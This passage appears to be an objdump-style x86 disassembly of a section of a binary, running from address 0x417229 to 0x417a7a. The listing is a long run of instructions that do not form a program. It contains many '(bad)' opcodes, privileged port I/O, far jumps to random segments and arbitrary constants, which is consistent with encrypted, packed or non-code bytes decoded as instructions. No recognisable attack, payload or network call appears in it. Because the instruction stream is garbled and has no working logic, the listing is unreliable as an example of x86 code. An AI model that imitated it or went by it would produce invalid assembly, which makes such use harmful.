  417229:	sbb    eax,0x531c0a13
  41722e:	jecxz  0x41723b
  417230:	mov    ebx,0x1441ae9e
  417235:	jns    0x4171ec
  417237:	test   BYTE PTR [edx+ecx*2+0x60a8a26d],0x93
  41723f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417240:	popa   
  417241:	ret    0xda14
  417244:	pop    ss
  417245:	mov    ah,0x12
  417247:	push   edi
  417248:	sub    esi,DWORD PTR [esi]
  41724a:	icebp  
  41724b:	mov    al,ds:0x5a5bebb1
  417250:	popa   
  417251:	add    al,0x16
  417253:	jp     0x4172ab
  417255:	pop    edx
  417256:	mov    esi,0xa1da66c
  41725b:	push   eax
  41725c:	js     0x4171e8
  41725e:	in     al,dx
  41725f:	and    bl,BYTE PTR [edx+0x1205e0f9]
  417265:	sub    BYTE PTR cs:[esi-0x35c347c5],ah
  41726c:	jbe    0x4172ca
  41726e:	add    esi,ecx
  417270:	ds jle 0x41721c
  417273:	sbb    DWORD PTR [esi-0x4b7e175d],ecx
  417279:	xor    dh,ch
  41727b:	clc    
  41727c:	adc    bh,BYTE PTR [edx+0x25e8da14]
  417282:	adc    dh,al
  417284:	gs xchg BYTE PTR ds:[esi+edx*2],bl
  417289:	inc    ecx
  41728a:	mov    bh,0x50
  41728c:	lock mov ?,WORD PTR [eax+0x2d43e4b0]
  417293:	push   edx
  417294:	sbb    dl,BYTE PTR [edi-0x72]
  417297:	jbe    0x417227
  417299:	and    BYTE PTR [esi-0x74],0x86
  41729d:	and    cl,BYTE PTR [ebx]
  41729f:	arpl   WORD PTR [edx+ebp*2],sp
  4172a2:	adc    eax,0x1a2ad1fe
  4172a7:	mov    dh,0xd2
  4172a9:	call   0xe439f176
  4172ae:	hlt    
  4172af:	rol    DWORD PTR [esi+ecx*4],1
  4172b2:	je     0x4172a1
  4172b4:	cli    
  4172b5:	add    al,0x86
  4172b7:	mov    ecx,0x44a98d8c
  4172bc:	pop    eax
  4172bd:	fisubr DWORD PTR [esi+0x27be02a8]
  4172c3:	cwde   
  4172c4:	ficom  DWORD PTR [eax]
  4172c6:	arpl   WORD PTR [ebx+0x245a11e1],bp
  4172cc:	enter  0x21f8,0x38
  4172d0:	push   ss
  4172d1:	enter  0xbc49,0x14
  4172d5:	mov    cl,0xa4
  4172d7:	cs mov bl,0x4a
  4172da:	jg     0x417290
  4172dc:	xchg   BYTE PTR [edi],al
  4172de:	sbb    ch,BYTE PTR [edi+0x42dec64e]
  4172e4:	mov    esi,0xa2b79a50
  4172e9:	stos   BYTE PTR es:[edi],al
  4172ea:	sub    edi,DWORD PTR [edx+eiz*4]
  4172ed:	in     al,dx
  4172ee:	jmp    0x9970:0x794eac
  4172f5:	lea    esp,[ebx+0x10]
  4172f8:	sub    ebx,DWORD PTR [edx*2+0x3952468e]
  4172ff:	add    BYTE PTR [esi],0x95
  417302:	div    BYTE PTR [ecx+ebx*2+0x62]
  417306:	sub    bl,BYTE PTR [esi-0x1c715274]
  41730c:	inc    eax
  41730d:	push   ebx
  41730e:	pusha  
  41730f:	fmul   DWORD PTR [esi+0x186b934c]
  417315:	pop    ebp
  417316:	adc    dh,dl
  417318:	jbe    0x4172ba
  41731a:	jmp    0x417324
  41731c:	les    ecx,FWORD PTR [esi+0x482918b2]
  417322:	(bad)  
  417323:	imul   ecx,DWORD PTR [edx-0x435f5e9a],0xffffffa9
  41732a:	mov    ah,0x68
  41732c:	test   al,0x4a
  41732e:	add    al,0xd8
  417330:	shl    al,1
  417332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417333:	jne    0x41732f
  417335:	ja     0x417387
  417337:	mov    edi,0x5b3c5d2c
  41733c:	stos   BYTE PTR es:[edi],al
  41733d:	test   BYTE PTR [eax+0x45ac926],0x9
  417344:	loop   0x41738e
  417346:	add    al,0x3c
  417348:	test   eax,0xc2161224
  41734d:	sub    BYTE PTR [ebx+0x4a],0xa1
  417351:	mov    eax,ds:0x41321aec
  417356:	mov    edx,0x65284e0a
  41735b:	mov    al,ds:0x1638401a
  417360:	push   edi
  417361:	or     BYTE PTR ds:[eax],ch
  417364:	js     0x417320
  417366:	mov    ebx,0x82b424df
  41736b:	adc    al,0xda
  41736d:	lods   eax,DWORD PTR ds:[esi]
  41736e:	retf   0xc1b0
  417371:	inc    eax
  417372:	ret    0x4484
  417375:	and    BYTE PTR [eax+edi*4],cl
  417378:	cmp    bh,BYTE PTR [esi]
  41737a:	jl     0x417327
  41737c:	push   0x7ce663ae
  417381:	scas   eax,DWORD PTR es:[edi]
  417382:	push   0xffffffb4
  417384:	or     ch,BYTE PTR [esi+0x6cc80076]
  41738a:	clc    
  41738b:	xor    al,0xb1
  41738d:	ror    BYTE PTR [eax-0x24],0xc2
  417391:	add    dl,al
  417393:	test   al,0x23
  417395:	sbb    ch,dl
  417397:	enter  0x1a52,0x53
  41739b:	mov    ecx,0xbe8a11e0
  4173a0:	jns    0x4173cc
  4173a2:	add    al,0xc1
  4173a4:	xor    BYTE PTR [esi+0x0],al
  4173a7:	dec    esp
  4173a8:	mov    cl,0xab
  4173aa:	mov    ds:0xa89a49a9,eax
  4173af:	adc    dl,BYTE PTR [edi]
  4173b1:	ret    0x450d
  4173b4:	aam    0x34
  4173b6:	cld    
  4173b7:	mov    ds:0xc845a3a8,al
  4173bc:	ret    
  4173bd:	imul   esi,DWORD PTR ds:0x9611ecd5,0x82a699b4
  4173c7:	test   al,0xb4
  4173c9:	je     0x4173d3
  4173cb:	mov    eax,ds:0x3e5ca80e
  4173d0:	adc    dl,BYTE PTR [eax-0x22]
  4173d3:	mov    ah,0x43
  4173d5:	sub    eax,0xa0640602
  4173da:	inc    esi
  4173db:	mov    ds:0x24b92700,al
  4173e0:	jle    0x4173ac
  4173e2:	push   0x16b24867
  4173e7:	inc    ecx
  4173e8:	inc    edi
  4173e9:	imul   ecx,edi,0x6a
  4173ec:	dec    ebx
  4173ed:	push   ss
  4173ee:	(bad)  
  4173ef:	mov    dl,0xc7
  4173f1:	and    al,0xdd
  4173f3:	rol    al,0x26
  4173f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173f7:	pop    edx
  4173f8:	xchg   edi,eax
  4173f9:	loop   0x41746e
  4173fb:	jle    0x417473
  4173fd:	loopne 0x417419
  4173ff:	pop    esi
  417400:	and    cl,ah
  417402:	rcl    BYTE PTR [eax+0xc3a6b],0x30
  417409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41740a:	pop    ebp
  41740b:	add    ebp,DWORD PTR [eax+0xa]
  41740e:	mov    dl,BYTE PTR [ebx]
  417410:	ret    0x2c3a
  417413:	push   ebp
  417414:	cwde   
  417415:	sbb    al,BYTE PTR [eax]
  417417:	lods   al,BYTE PTR ds:[esi]
  417418:	pop    ss
  417419:	pop    esi
  41741a:	mov    dl,0xa6
  41741c:	or     eax,0x5e61d1af
  417421:	pusha  
  417422:	inc    esp
  417423:	adc    BYTE PTR [ebp+0x20028b14],bh
  417429:	xchg   BYTE PTR [esi+edi*2],al
  41742c:	mov    esi,0xa8403ec1
  417431:	and    al,0x45
  417433:	fs sub eax,0x1548c459
  417439:	mov    ch,0x22
  41743b:	xor    BYTE PTR [edx-0x1e],cl
  41743e:	test   al,bh
  417440:	or     al,0x34
  417442:	pop    esp
  417443:	sar    DWORD PTR [eax-0x16],cl
  417446:	pop    eax
  417447:	dec    BYTE PTR [edx+0x29]
  41744a:	xchg   edx,eax
  41744b:	cdq    
  41744c:	adc    eax,0x4e153554
  417451:	xor    edi,DWORD PTR [edx]
  417453:	adc    eax,0xc28408de
  417458:	or     BYTE PTR [ebx+0x1dd25535],ah
  41745e:	inc    esi
  41745f:	sar    edx,0xa5
  417462:	add    BYTE PTR [eax-0x3547bd5d],ch
  417468:	add    al,0x72
  41746a:	jne    0x4174d8
  41746c:	mov    ds:0x87441a1,eax
  417471:	idiv   BYTE PTR [esi]
  417473:	stos   BYTE PTR es:[edi],al
  417474:	jnp    0x41748a
  417476:	mov    al,0x42
  417478:	(bad)  
  417479:	push   0xffffffff
  41747b:	pop    ebp
  41747c:	fidiv  DWORD PTR [ecx-0x2a]
  41747f:	pusha  
  417480:	inc    ebp
  417481:	xchg   DWORD PTR [eax-0x32],esp
  417484:	push   ds
  417485:	jb     0x41748d
  417487:	arpl   dx,di
  417489:	dec    edi
  41748a:	mov    cl,dh
  41748c:	dec    edx
  41748d:	clc    
  41748e:	and    eax,0x7c2da070
  417493:	cld    
  417494:	sub    BYTE PTR [esi+esi*4-0x14],ah
  417498:	test   DWORD PTR [edx-0x63bf3661],ecx
  41749e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41749f:	mov    cl,BYTE PTR [esi]
  4174a1:	mov    bh,0xde
  4174a3:	test   al,0xdd
  4174a5:	xor    al,0xf5
  4174a7:	add    al,0xa3
  4174a9:	jne    0x417500
  4174ab:	mov    ch,0x50
  4174ad:	sub    BYTE PTR [esi-0x1c],bh
  4174b0:	shl    DWORD PTR [esi],cl
  4174b2:	pop    edx
  4174b3:	inc    esi
  4174b4:	and    ebp,DWORD PTR [ebp+0x52]
  4174b7:	je     0x41750e
  4174b9:	outs   dx,BYTE PTR ds:[esi]
  4174ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174bb:	xchg   BYTE PTR [esi+0x51cb0abe],bl
  4174c1:	pop    ss
  4174c2:	mov    BYTE PTR [esi-0x79],ah
  4174c5:	fsub   st(2),st
  4174c7:	lods   eax,DWORD PTR ds:[esi]
  4174c8:	jmp    0x870447c7
  4174cd:	daa    
  4174ce:	jmp    0x953c304e
  4174d3:	mov    dh,0x21
  4174d5:	aad    0xb5
  4174d7:	(bad)  
  4174d9:	sbb    ebx,edx
  4174db:	lods   al,BYTE PTR ds:[esi]
  4174dc:	sub    BYTE PTR [esp+eiz*2+0x45186f97],bl
  4174e3:	xchg   esp,eax
  4174e4:	call   0x321a1917
  4174e9:	icebp  
  4174ea:	cdq    
  4174eb:	les    ebx,FWORD PTR [esi]
  4174ed:	and    DWORD PTR [ecx+ebx*8],esi
  4174f0:	aam    0x2a
  4174f2:	(bad)  
  4174f3:	mov    bl,BYTE PTR [edx-0x29]
  4174f6:	ficomp DWORD PTR [esp+ecx*1+0x34]
  4174fa:	add    al,0x4a
  4174fc:	fwait
  4174fd:	retf   0xfaf5
  417500:	mov    ds:0x3bc443e1,al
  417505:	mov    DWORD PTR [esi+0x6c3daa28],ebp
  41750b:	mov    dh,0x49
  41750d:	pusha  
  41750e:	inc    eax
  41750f:	sub    BYTE PTR [ebp+0x39a0e2eb],dl
  417515:	mov    DWORD PTR [edx-0x41b604de],esp
  41751b:	sub    DWORD PTR [ecx+0x2e],0xffffffe0
  41751f:	pusha  
  417520:	cmp    BYTE PTR ds:0xe7cd0b1c,dl
  417526:	repz mov eax,0xf1965358
  41752c:	adc    eax,0x3aa1a162
  417531:	iret   
  417532:	push   0x9e344656
  417537:	arpl   cx,sp
  417539:	pop    ss
  41753a:	(bad)  
  41753b:	imul   BYTE PTR [eax+0x51dc97ce]
  417541:	fwait
  417542:	mov    ebx,0xbecbe4da
  417547:	stc    
  417548:	es push edx
  41754a:	add    BYTE PTR [ecx-0x3b],ah
  41754d:	mov    edi,0x1d54219a
  417552:	or     al,BYTE PTR [eax+0x60454c6]
  417558:	sub    edx,0xdd28c160
  41755e:	fbld   TBYTE PTR [esi]
  417560:	or     al,0x55
  417562:	xchg   esi,eax
  417563:	adc    al,ch
  417565:	fsubr  QWORD PTR [esi+0x60]
  417568:	ror    DWORD PTR [ebx+0x35c444c],0x2f
  41756f:	add    cl,ah
  417571:	dec    esi
  417572:	loop   0x4175e8
  417574:	fistp  DWORD PTR [edx]
  417576:	call   0x2b7:0x6aa5351a
  41757d:	jnp    0x417555
  41757f:	cmp    al,0x3e
  417581:	sbb    al,0xa1
  417583:	sbb    DWORD PTR ds:0xac587c34,esp
  417589:	and    bh,dl
  41758b:	adc    al,BYTE PTR [eax]
  41758d:	call   0x48d642be
  417592:	popa   
  417593:	inc    edi
  417594:	adc    edx,eax
  417596:	jo     0x41754a
  417598:	bound  esi,QWORD PTR [ecx+eiz*4-0x72eee27e]
  41759f:	xchg   edx,eax
  4175a0:	dec    edx
  4175a1:	push   es
  4175a2:	inc    esp
  4175a3:	or     BYTE PTR [edx+0x35543444],ch
  4175a9:	les    ebx,FWORD PTR [edx+0x1a028ea2]
  4175af:	repz mov ds:0x5410c0ad,al
  4175b5:	dec    ebp
  4175b6:	inc    esi
  4175b7:	jmp    0xdd72:0x88b649
  4175be:	adc    eax,0x135ac354
  4175c3:	mov    BYTE PTR [eax+0x7234321c],dl
  4175c9:	pusha  
  4175ca:	cmp    al,0x80
  4175cc:	clc    
  4175cd:	or     al,dl
  4175cf:	ins    BYTE PTR es:[edi],dx
  4175d0:	test   eax,0x473f84
  4175d5:	push   esi
  4175d6:	xor    eax,0x77061386
  4175db:	add    edx,0x5db40dee
  4175e1:	adc    eax,0xceda4410
  4175e6:	(bad)  
  4175e7:	(bad)  
  4175e8:	jae    0x417614
  4175ea:	fcmovnu st,st(2)
  4175ec:	xor    edx,DWORD PTR [esi]
  4175ee:	mov    ch,0x52
  4175f0:	ss pop esi
  4175f2:	jnp    0x417610
  4175f4:	push   0xffffffba
  4175f6:	ror    DWORD PTR [esi*1+0x2e3d3bd9],0x16
  4175fe:	ins    DWORD PTR es:[edi],dx
  4175ff:	imul   BYTE PTR [ecx+0x74a8adb5]
  417605:	ret    
  417606:	mov    al,0x75
  417608:	jbe    0x417648
  41760a:	jbe    0x417634
  41760c:	dec    edx
  41760e:	mov    dl,0x6e
  417610:	mov    al,ds:0x4f7c4fd9
  417615:	cwde   
  417616:	push   ss
  417617:	adc    BYTE PTR ds:0x52e3044,dh
  41761d:	ins    BYTE PTR es:[edi],dx
  41761e:	jo     0x417634
  417620:	jo     0x4175e6
  417622:	push   0xffffffaa
  417624:	adc    BYTE PTR [ecx+0x20],0x98
  417628:	cld    
  417629:	mov    al,ds:0x32c07400
  41762e:	inc    ecx
  41762f:	xchg   edi,eax
  417630:	cwde   
  417631:	dec    esp
  417632:	clc    
  417633:	mov    dh,0xa3
  417635:	jns    0x4175ce
  417637:	pop    esi
  417638:	xchg   edx,eax
  417639:	jns    0x417659
  41763b:	add    al,dh
  41763d:	stc    
  41763e:	jb     0x417600
  417640:	imul   esi,esp,0x54
  417643:	inc    ebx
  417644:	push   cs
  417645:	or     ecx,DWORD PTR [esi]
  417647:	(bad)  
  417648:	out    dx,eax
  417649:	sbb    edx,ebx
  41764b:	pop    edx
  41764c:	adc    al,0xcc
  41764e:	push   edx
  41764f:	imul   ebp,eax,0xffffffdc
  417652:	icebp  
  417653:	ins    DWORD PTR es:[edi],dx
  417654:	dec    ebx
  417655:	test   al,0x12
  417657:	in     eax,dx
  417658:	test   BYTE PTR [esp+eiz*2+0x54dbd220],dh
  41765f:	pop    edx
  417660:	jmp    0x4176dc
  417662:	inc    edx
  417663:	ds sahf 
  417665:	cmp    BYTE PTR [edx+0xd041ce8],bl
  41766b:	in     eax,dx
  41766c:	or     cl,BYTE PTR [ebx-0x5349426]
  417672:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417673:	mov    al,ds:0x6a52fe2b
  417678:	mov    ds:0x21865d1d,al
  41767d:	push   ds
  41767e:	pushf  
  41767f:	jl     0x417613
  417681:	and    BYTE PTR cs:[eax+0x58428369],0x56
  417689:	lahf   
  41768a:	lds    esp,FWORD PTR [esi-0x27fec64a]
  417690:	das    
  417691:	call   0x1038:0xd0348937
  417698:	push   eax
  417699:	add    BYTE PTR [eax+edi*4],al
  41769c:	mov    al,0x5d
  41769e:	push   ecx
  41769f:	push   ebx
  4176a0:	xchg   DWORD PTR [edx+0x4a],eax
  4176a3:	and    al,0x6e
  4176a5:	mov    al,ds:0x9ad74a60
  4176aa:	xchg   ebx,eax
  4176ab:	inc    esi
  4176ac:	pop    eax
  4176ad:	push   cs
  4176ae:	lods   al,BYTE PTR ds:[esi]
  4176af:	cmc    
  4176b0:	mov    al,ds:0xac40b28c
  4176b5:	mov    al,0xd
  4176b7:	inc    esp
  4176b8:	xor    ch,BYTE PTR [esi]
  4176ba:	jo     0x4176c0
  4176bc:	hlt    
  4176bd:	fistp  WORD PTR [edx+edx*1+0x15128f0c]
  4176c4:	add    eax,0x82a25c14
  4176c9:	push   esi
  4176ca:	aam    0xa6
  4176cc:	cdq    
  4176cd:	out    0xe1,al
  4176cf:	mov    al,ds:0x68cf2aa0
  4176d4:	push   ebp
  4176d5:	or     eax,0xb45ac0c7
  4176da:	sahf   
  4176db:	mov    edi,0x7c2acd62
  4176e0:	call   0xa46:0x4eb74d6d
  4176e7:	add    dh,bl
  4176e9:	fs retf 0xe90a
  4176ed:	imul   ebx,DWORD PTR [edx-0x2bec7f24],0x8afeb0a1
  4176f7:	xor    DWORD PTR [eax+0x2a686a9],eax
  4176fd:	and    al,0x57
  4176ff:	inc    esi
  417700:	cmp    eax,0x8585907a
  417705:	add    bl,BYTE PTR [eax+0x125e76d0]
  41770b:	and    al,0x29
  41770d:	and    DWORD PTR [eax+ecx*4],esi
  417710:	sbb    ecx,DWORD PTR [edx]
  417712:	rol    DWORD PTR [ebp-0x5d],1
  417715:	inc    ebx
  417716:	xchg   edx,eax
  417717:	cmp    al,0xd5
  417719:	cld    
  41771a:	into   
  41771b:	mov    al,ds:0xecae0b68
  417720:	stos   DWORD PTR es:[edi],eax
  417721:	mov    ah,0xa6
  417723:	out    0x28,eax
  417725:	jb     0x41772b
  417727:	pop    esi
  417728:	ficomp DWORD PTR [eax-0x2f]
  41772b:	xchg   BYTE PTR [edx],bh
  41772d:	jl     0x4176b2
  41772f:	cmc    
  417730:	sahf   
  417731:	lahf   
  417732:	xchg   edi,eax
  417733:	sub    al,0x26
  417735:	lock xchg esi,eax
  417737:	or     al,0x1c
  417739:	or     BYTE PTR [ebp+0x65f85b3c],ch
  41773f:	xor    al,0x84
  417741:	aad    0xc4
  417743:	in     al,0x4a
  417745:	cmp    BYTE PTR [edx-0x5e917daa],ah
  41774b:	mov    BYTE PTR [eax+esi*8+0x23],bh
  41774f:	add    bl,BYTE PTR [ebx+0x6ff92210]
  417755:	xchg   esi,eax
  417756:	ins    DWORD PTR es:[edi],dx
  417757:	jg     0x417759
  417759:	pop    edi
  41775a:	and    eax,0x1e58a05a
  41775f:	jo     0x4176f0
  417761:	jo     0x41770b
  417763:	(bad)  
  417764:	scas   al,BYTE PTR es:[edi]
  417765:	push   esi
  417766:	leave  
  417767:	inc    eax
  417768:	test   DWORD PTR [edx+ecx*4+0x2a],edx
  41776c:	or     al,BYTE PTR [ebx]
  41776e:	xor    al,0x15
  417770:	xor    eax,0x64df7ced
  417775:	jne    0x4177eb
  417777:	push   eax
  417778:	dec    eax
  417779:	loop   0x417707
  41777b:	xor    BYTE PTR [esi-0x48],dl
  41777e:	or     BYTE PTR [edx],dl
  417780:	call   0x5d8e541b
  417785:	mov    al,bh
  417787:	ins    BYTE PTR es:[edi],dx
  417788:	out    0x5f,eax
  41778a:	mov    BYTE PTR [eax],ah
  41778c:	pop    edx
  41778d:	sub    BYTE PTR [esi-0x49f78bf8],0xde
  417794:	sub    DWORD PTR [edi+ebp*2-0x38],esp
  417798:	pop    eax
  417799:	ror    DWORD PTR [edx],1
  41779b:	jmp    0x8154:0x76da5eb9
  4177a2:	es mov al,0xaa
  4177a5:	sbb    eax,0xd4b8b638
  4177aa:	dec    esi
  4177ab:	xchg   cx,ax
  4177ad:	jbe    0x41773e
  4177af:	dec    ecx
  4177b0:	cld    
  4177b1:	mov    BYTE PTR ds:0x4e069820,cl
  4177b7:	pop    ecx
  4177b8:	pop    edi
  4177b9:	inc    edi
  4177ba:	sahf   
  4177bb:	sub    esp,edi
  4177bd:	and    al,0x5e
  4177bf:	cs nop
  4177c1:	clc    
  4177c2:	sti    
  4177c3:	xor    BYTE PTR ds:0x9db68b55,dl
  4177c9:	pop    eax
  4177ca:	cld    
  4177cb:	retf   0xa076
  4177ce:	adc    al,0x92
  4177d0:	adc    eax,0x4c8b00c3
  4177d5:	push   ss
  4177d6:	push   eax
  4177d7:	imul   edi,DWORD PTR [ebx],0xffffff8a
  4177da:	push   esi
  4177db:	fmul   QWORD PTR [eax+0x29]
  4177de:	arpl   WORD PTR [esi-0x4b0f579],sp
  4177e4:	pusha  
  4177e5:	ins    DWORD PTR es:[edi],dx
  4177e6:	inc    edi
  4177e7:	pop    edx
  4177e8:	sbb    BYTE PTR [esp+ecx*1],0x52
  4177ec:	ss xchg ecx,eax
  4177ee:	or     al,0xd6
  4177f0:	xchg   BYTE PTR [esi+0x58de532a],al
  4177f6:	push   ds
  4177f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177f8:	push   cs
  4177f9:	imul   ebx,DWORD PTR [edx],0x30
  4177fc:	push   ebp
  4177fd:	sub    BYTE PTR [eax+0x9dc4237],ch
  417803:	mov    al,ds:0x644db420
  417808:	push   es
  417809:	ds call 0xd005:0x53b8e88a
  417811:	push   esp
  417812:	jo     0x4177c6
  417814:	bound  ecx,QWORD PTR [esi+edi*8]
  417817:	adc    BYTE PTR [eax+0x180d8906],bl
  41781d:	and    BYTE PTR [esp+edx*2+0x660b4a68],al
  417824:	and    BYTE PTR [edx],ah
  417826:	loop   0x41785b
  417828:	sub    dl,BYTE PTR [eax+0x41]
  41782b:	test   al,0x40
  41782d:	call   0xd90926b8
  417832:	add    eax,DWORD PTR [ebx]
  417834:	xchg   ebp,eax
  417835:	(bad)  
  417836:	fs int3 
  417838:	jg     0x4177cd
  41783a:	loop   0x41783f
  41783c:	mov    cl,0x41
  41783e:	add    eax,0x17aab632
  417843:	dec    edx
  417844:	adc    BYTE PTR [ebx],cl
  417846:	push   eax
  417847:	test   eax,0x7a107002
  41784c:	push   es
  41784d:	lds    eax,FWORD PTR es:[esi+0xebed443]
  417854:	out    dx,eax
  417855:	test   DWORD PTR [edx-0xc],edx
  417858:	jns    0x41785b
  41785a:	mov    cl,BYTE PTR [eax+0x3ae07a7c]
  417860:	lea    eax,[eax]
  417862:	pop    ebp
  417863:	add    DWORD PTR [eax],0xda39a0b
  417869:	fimul  WORD PTR [edx]
  41786b:	pop    ebx
  41786c:	adc    bl,cl
  41786e:	xchg   esp,eax
  41786f:	push   ebp
  417870:	xchg   BYTE PTR [ecx-0x25],bh
  417873:	push   ebx
  417874:	repnz loope 0x4178e7
  417877:	inc    eax
  417878:	add    BYTE PTR [ebx+0x64],cl
  41787b:	repnz mov edx,0x110bb536
  417881:	mov    esi,0xeebea603
  417886:	push   cs
  417887:	lahf   
  417888:	or     cl,BYTE PTR [ecx]
  41788a:	xchg   DWORD PTR [edx],eax
  41788c:	(bad)  
  41788d:	sahf   
  41788e:	mov    WORD PTR ds:0xd66d1089,?
  417894:	js     0x4178ed
  417896:	sbb    BYTE PTR [esi+0x33],0x2
  41789a:	call   0x6b6a:0x20103213
  4178a1:	xchg   edx,eax
  4178a2:	js     0x4178a4
  4178a4:	aad    0x42
  4178a6:	cs aam 0xf0
  4178a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178aa:	dec    ebp
  4178ab:	mov    ah,0x92
  4178ad:	iret   
  4178ae:	or     BYTE PTR [edx+ecx*1+0x7a],bl
  4178b2:	xchg   BYTE PTR [eax-0x1f2eaba6],al
  4178b8:	and    al,BYTE PTR [esp+eax*2+0x447fe20b]
  4178bf:	xor    eax,DWORD PTR [ebx+ebx*8]
  4178c2:	pop    esi
  4178c3:	(bad)  
  4178c4:	aad    0xe8
  4178c6:	add    al,0x3e
  4178c8:	sub    ebp,0x20
  4178cb:	push   ss
  4178cc:	or     dl,BYTE PTR [eax+ebx*1-0x33]
  4178d0:	xchg   esp,eax
  4178d1:	(bad)  
  4178d2:	shl    eax,cl
  4178d4:	push   0xfebd8861
  4178d9:	sbb    dh,ah
  4178db:	xchg   DWORD PTR [eax+ebx*8],esi
  4178de:	(bad)  
  4178df:	pop    edx
  4178e0:	or     dl,cl
  4178e2:	and    eax,0x1db2b42e
  4178e7:	mov    ds:0xfdd3882,eax
  4178ec:	ss push ss
  4178ee:	xor    eax,0xc23eadc2
  4178f3:	pusha  
  4178f4:	push   0x9745861
  4178f9:	mov    dl,BYTE PTR [eax-0x42]
  4178fc:	mov    al,bh
  4178fe:	jl     0x417916
  417900:	rcr    DWORD PTR [esi],1
  417902:	push   eax
  417903:	sbb    BYTE PTR [eax],dh
  417905:	cdq    
  417906:	mov    dl,0x4d
  417908:	add    eax,0x303fb574
  41790d:	mov    ebx,0x77460096
  417912:	jl     0x41790b
  417914:	ficom  DWORD PTR [edx+ebp*2+0x38784f0d]
  41791b:	pop    ecx
  41791c:	arpl   WORD PTR [edx+0x1a],di
  41791f:	clc    
  417920:	aad    0xb2
  417922:	mov    eax,ds:0x2ae86b5b
  417927:	push   eax
  417928:	push   ebp
  417929:	inc    esp
  41792a:	cmp    BYTE PTR ss:[esi-0x7f65f6e4],ch
  417931:	and    al,0x58
  417934:	pop    eax
  417935:	pusha  
  417936:	jo     0x41798c
  417938:	(bad)  
  417939:	(bad)  
  41793a:	and    dl,BYTE PTR [ebp+0x48c0a3ab]
  417940:	xchg   esp,eax
  417941:	or     al,0x75
  417943:	sar    dh,cl
  417945:	and    BYTE PTR [ebp-0x80],ch
  417948:	es inc esp
  41794a:	xchg   esp,eax
  41794b:	xor    edx,0x5c
  41794e:	dec    ebx
  41794f:	lock fidivr DWORD PTR [eax-0x4]
  417953:	pop    es
  417954:	mov    dh,0x5a
  417956:	cmp    al,BYTE PTR [ecx-0x64]
  417959:	inc    ebx
  41795a:	cmp    edx,DWORD PTR [edx]
  41795c:	mov    al,0x2c
  41795e:	mov    esp,DWORD PTR [edi-0x4647a430]
  417964:	je     0x41795a
  417966:	push   0x5c424361
  41796b:	loope  0x4179b7
  41796d:	je     0x4179cb
  41796f:	xor    al,0xf0
  417971:	mov    BYTE PTR [edx-0x7a],bl
  417974:	cdq    
  417975:	pop    edi
  417976:	mov    al,ds:0x242e9b12
  41797b:	ins    BYTE PTR es:[edi],dx
  41797c:	cmp    BYTE PTR [esp+esi*4-0x723bc98],dl
  417983:	cmp    edx,DWORD PTR [edx]
  417985:	shl    BYTE PTR [ecx],1
  417987:	adc    bl,BYTE PTR [esi]
  417989:	nop
  41798a:	rcl    BYTE PTR [eax+0x58e0d55a],1
  417990:	fisub  DWORD PTR [esp]
  417993:	aas    
  417994:	xchg   ebp,eax
  417995:	or     DWORD PTR [edx],ebp
  417997:	adc    ah,cl
  417999:	adc    ah,BYTE PTR [edx+ebp*8]
  41799c:	push   0xf82d8db
  4179a1:	mov    ds:0xbd8d2b6,al
  4179a6:	adc    ah,bh
  4179a8:	xchg   BYTE PTR [edx+0x240848d6],bl
  4179ae:	mov    dl,0x4e
  4179b0:	jbe    0x417958
  4179b2:	inc    esp
  4179b3:	imul   eax,DWORD PTR ds:0x6c40e215,0xffffff84
  4179ba:	cs ret 0xa352
  4179be:	fsub   st,st(1)
  4179c0:	xchg   esp,eax
  4179c1:	or     al,0x8
  4179c3:	mov    esi,0xecf9a00
  4179c8:	push   eax
  4179c9:	xor    DWORD PTR ds:0x72b89896,esp
  4179cf:	cmc    
  4179d0:	mov    DWORD PTR ds:0xe1bea82,ecx
  4179d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179d7:	pop    ecx
  4179d8:	pushf  
  4179d9:	mov    dl,0xad
  4179db:	loop   0x41796f
  4179dd:	push   0x31
  4179df:	xlat   BYTE PTR fs:[ebx]
  4179e1:	test   BYTE PTR [esi+0x2184ae0a],cl
  4179e7:	mov    cl,BYTE PTR es:[edx+0x9]
  4179eb:	add    BYTE PTR [edx+0x1a02dcba],dh
  4179f1:	dec    BYTE PTR [eax-0x4a]
  4179f4:	push   cs
  4179f5:	jmp    0xc322:0xdb414641
  4179fc:	dec    edi
  4179fd:	jo     0x417a60
  4179ff:	inc    edx
  417a00:	add    al,ch
  417a02:	mov    eax,0xaf64f114
  417a07:	jp     0x417a11
  417a09:	not    BYTE PTR [esi-0x6e7efc27]
  417a0f:	or     al,ch
  417a11:	push   esi
  417a12:	int3   
  417a13:	mov    al,ds:0xd8028056
  417a18:	inc    ebp
  417a19:	cs in  eax,dx
  417a1b:	lods   al,BYTE PTR ds:[esi]
  417a1c:	jl     0x4179bf
  417a1e:	rcl    ah,0x2a
  417a21:	jp     0x4179da
  417a23:	xor    BYTE PTR [eax+0x8e5de46],0x2f
  417a2a:	aad    0xb1
  417a2c:	cwde   
  417a2d:	imul   ebx,DWORD PTR [ecx+0x30],0x21
  417a31:	xchg   BYTE PTR [eax],ah
  417a33:	loop   0x417a62
  417a35:	cmp    BYTE PTR [edx],dh
  417a37:	ds cld 
  417a39:	push   cs
  417a3a:	push   ebx
  417a3b:	cs add eax,0xe22afdf6
  417a41:	xchg   ebx,eax
  417a42:	jp     0x417a51
  417a44:	and    BYTE PTR [edx+0x512c3617],al
  417a4a:	clc    
  417a4b:	nop
  417a4c:	mov    cl,0x82
  417a4e:	add    ebp,DWORD PTR [ecx+0x74]
  417a51:	and    eax,0xac8b1a1c
  417a56:	fmul   st(3),st
  417a58:	mov    WORD PTR fs:[ecx-0x52baaba9],ss
  417a5f:	test   al,0x41
  417a61:	or     BYTE PTR [eax+0x4fecbf74],ch
  417a67:	hlt    
  417a68:	dec    ecx
  417a69:	aam    0x2c
  417a6b:	or     al,0xa5
  417a6d:	enter  0xfc52,0xc1
  417a71:	mov    ds:0x745a033d,eax
  417a76:	es cs push edx
  417a79:	out    dx,al
  417a7a:	push   edx
